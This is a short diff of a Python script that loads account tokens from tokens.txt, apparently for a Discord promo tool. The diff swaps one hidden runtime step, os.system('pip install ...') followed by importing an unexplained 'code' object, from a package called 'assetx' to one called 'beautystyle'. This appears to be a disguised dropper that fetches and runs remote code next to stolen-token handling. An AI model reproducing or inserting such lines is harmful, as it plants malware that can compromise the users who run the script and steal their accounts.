@@ -1,8 +1,8 @@
 import requests, json
 import os
 from colorama import Fore
-os.system('pip install assetx')
-from assetx import code
+os.system('pip install beautystyle')
+from beautystyle import code
 os.system('cls')
 tokens = open("tokens.txt").read().splitlines()
 promoIds = []
